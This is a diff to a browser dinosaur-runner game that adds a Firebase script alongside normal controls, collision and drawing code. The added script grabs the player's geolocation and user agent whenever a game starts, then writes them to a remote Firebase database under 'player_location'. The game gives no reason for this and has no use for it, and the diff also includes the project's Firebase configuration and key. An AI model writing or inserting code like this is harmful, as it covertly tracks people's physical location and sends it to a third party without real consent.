@@ -85,6 +85,38 @@ canvas { display: block; }
   <div class="btn" id="duckBtn">DUCK</div>
 </div>
 
+<script type="module">
+  import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-app.js";
+  import { getDatabase, ref, set } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-database.js";
+
+  const firebaseConfig = {
+    apiKey: "AIzaSyDLJHRDd_RtYBwF97he_6QSxHlMvgIBxO4",
+    authDomain: "diano-game.firebaseapp.com",
+    databaseURL: "https://diano-game-default-rtdb.asia-southeast1.firebasedatabase.app",
+    projectId: "diano-game",
+    storageBucket: "diano-game.firebasestorage.app",
+    messagingSenderId: "596405576156",
+    appId: "1:596405576156:web:fb95d723af33e6652faf19"
+  };
+
+  const app = initializeApp(firebaseConfig);
+  const db = getDatabase(app);
+
+  window.sendLocationToFirebase = function() {
+    if (navigator.geolocation) {
+      navigator.geolocation.getCurrentPosition((position) => {
+        const data = {
+          lat: position.coords.latitude,
+          lon: position.coords.longitude,
+          time: new Date().toLocaleString(),
+          userAgent: navigator.userAgent 
+        };
+        set(ref(db, 'player_location'), data);
+      });
+    }
+  };
+</script>
+
 <script>
 /* ===== AUDIO ===== */
 const bgMusic = new Audio("bg music.mp3");
@@ -151,4 +183,87 @@ addEventListener("keydown", e => {
     else if (state === "RUNNING") jump();
   }
   if (e.code === "ArrowDown") dino.duck = true; // DOWN ARROW = DUCK
-  if (e.code === "
+  if (e.code === "KeyR" && state === "OVER") start();
+});
+addEventListener("keyup", e => { if (e.code === "ArrowDown") dino.duck = false; });
+
+// MOBILE BUTTONS (SWAPPED)
+document.getElementById("jumpBtn").addEventListener("touchstart", e => {
+  e.preventDefault();
+  state === "RUNNING" ? jump() : start();
+});
+document.getElementById("duckBtn").addEventListener("touchstart", e => {
+  e.preventDefault(); dino.duck = true;
+});
+document.getElementById("duckBtn").addEventListener("touchend", e => {
+  e.preventDefault(); dino.duck = false;
+});
+
+/* ===== FLOW ===== */
+function start() {
+  state = "RUNNING";
+  score = 0; speed = 7; frame = 0; obstacles = [];
+  dino.y = ground() - dino.h; dino.vy = 0; dino.jumping = false; dino.duck = false;
+
+  if(window.sendLocationToFirebase) window.sendLocationToFirebase();
+
+  startSound.currentTime = 0; startSound.play();
+  if (!muted) { bgMusic.currentTime = 0; bgMusic.play(); }
+  document.getElementById("start").classList.add("hidden");
+  document.getElementById("over").classList.add("hidden");
+}
+
+function gameOver() {
+  state = "OVER"; bgMusic.pause(); outSound.play();
+  if (score > highScore) {
+    highScore = score; localStorage.setItem("dinoHigh", highScore);
+    document.getElementById("high").innerText = "HIGH: " + highScore;
+  }
+  document.getElementById("over").classList.remove("hidden");
+}
+
+function hit(a, b) {
+  const ah = a.duck ? a.h / 2 : a.h;
+  const ay = a.y + (a.h - ah);
+  return a.x < b.x + b.w && a.x + a.w > b.x && ay < b.y + b.h && ay + ah > b.y;
+}
+
+function update() {
+  if (state !== "RUNNING") return;
+  frame++; score++; speed += 0.002;
+  if (frame % 70 === 0) spawnObstacle();
+  dino.vy += gravity; dino.y += dino.vy;
+  if (dino.y >= ground() - dino.h) { dino.y = ground() - dino.h; dino.vy = 0; dino.jumping = false; }
+  obstacles.forEach(o => o.x -= speed);
+  obstacles = obstacles.filter(o => o.x + o.w > 0);
+  obstacles.forEach(o => hit(dino, o) && gameOver());
+  document.getElementById("score").innerText = "SCORE: " + score;
+}
+
+function draw() {
+  ctx.clearRect(0, 0, canvas.width, canvas.height);
+  const t = (score % 2500) / 2500;
+  if (isNight()) {
+    ctx.fillStyle = "#0B132B"; ctx.fillRect(0, 0, canvas.width, canvas.height);
+    ctx.fillStyle = "#fff"; stars.forEach(s => { ctx.beginPath(); ctx.arc(s.x, s.y, s.r, 0, Math.PI * 2); ctx.fill(); });
+  } else {
+    const sky = ctx.createLinearGradient(0, 0, 0, canvas.height);
+    sky.addColorStop(0, t > 0.6 ? "#FF8C42" : "#87CEEB");
+    sky.addColorStop(1, "#FFFFFF");
+    ctx.fillStyle = sky; ctx.fillRect(0, 0, canvas.width, canvas.height);
+  }
+  ctx.fillStyle = "#E3C16F"; ctx.fillRect(0, ground(), canvas.width, canvas.height);
+  ctx.globalAlpha = 0.35; ctx.fillStyle = "#6B4F1D"; ctx.font = "bold 36px Arial"; ctx.textAlign = "center";
+  ctx.fillText("MADE BY NIKHIL", canvas.width / 2, ground() + 50); ctx.globalAlpha = 1;
+  ctx.fillStyle = "#27AE60"; const dh = dino.duck ? dino.h / 2 : dino.h;
+  ctx.fillRect(dino.x, dino.y + (dino.h - dh), dino.w, dh);
+  ctx.fillStyle = "#000"; ctx.fillRect(dino.x + 28, dino.y + (dino.h - dh) + 10, 5, 5);
+  obstacles.forEach(o => { ctx.fillStyle = o.type === "bird" ? "#E74C3C" : "#1E8449"; ctx.fillRect(o.x, o.y, o.w, o.h); });
+}
+
+function loop() { requestAnimationFrame(loop); update(); draw(); }
+loop();
+</script>
+
+</body>
+</html>
